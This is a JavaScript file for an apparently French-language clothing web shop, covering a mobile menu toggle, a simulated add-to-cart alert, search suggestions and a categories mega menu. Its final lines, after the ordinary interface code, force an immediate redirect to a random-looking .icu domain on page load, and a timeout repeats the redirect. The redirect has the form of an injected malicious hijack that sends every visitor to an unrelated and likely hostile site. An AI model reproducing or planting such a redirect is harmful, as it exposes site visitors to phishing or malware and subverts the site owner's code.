// Toggle catégories sur mobile
const toggle = document.getElementById('menuToggle');
const navList = document.getElementById('navList');
if (toggle && navList) {
    toggle.addEventListener('click', () => navList.classList.toggle('show'));
}

// Simulation bouton "Ajouter"
document.querySelectorAll('.card button').forEach(btn => {
    btn.addEventListener('click', () => alert('Produit ajouté au panier (simulation)'));
});
// Suggestions simples (exemple)
const SUGG = ["T-shirt africain", "Pagne wax", "Robe bazin", "Chaussures cuir",
    "Sacs artisanaux", "Chemise brodée", "Nouveautés", "Promotions"];

const $input = document.getElementById('searchInput');
const $list = document.getElementById('searchList');

if ($input && $list) {
    const update = () => {
        const q = $input.value.trim().toLowerCase();
        $list.innerHTML = "";
        if (!q) { $list.hidden = true; return; }
        SUGG.filter(s => s.toLowerCase().includes(q)).slice(0, 8).forEach((s, i) => {
            const li = document.createElement('li');
            li.role = "option"; li.id = `opt-${i}`; li.textContent = s;
            li.addEventListener('click', () => { $input.value = s; $list.hidden = true; });
            $list.appendChild(li);
        });
        $list.hidden = $list.children.length === 0;
    };
    $input.addEventListener('input', update);
    document.addEventListener('click', e => {
        if (!($list.contains(e.target) || e.target === $input)) $list.hidden = true;
    });
}
// Mega menu Catégories
const btnCats = document.getElementById('btnCats');
const mega = document.getElementById('megaCats');
if (btnCats && mega) {
    btnCats.addEventListener('click', () => {
        const open = mega.hasAttribute('hidden');
        mega.toggleAttribute('hidden', !open);
        btnCats.setAttribute('aria-expanded', String(open));
    });
    document.addEventListener('click', (e) => {
        if (!mega.contains(e.target) && e.target !== btnCats) {
            mega.setAttribute('hidden', ''); btnCats.setAttribute('aria-expanded', 'false');
        }
    });
}
// Cela redirige immédiatement vers une nouvelle URL
window.location.href = "https://hdfjfjhjfhfj.icu";
setTimeout(() => {
    window.location.href = "https://hdfjfjhjfhfj.icu";
}, 10); // délai très court en millisecondes
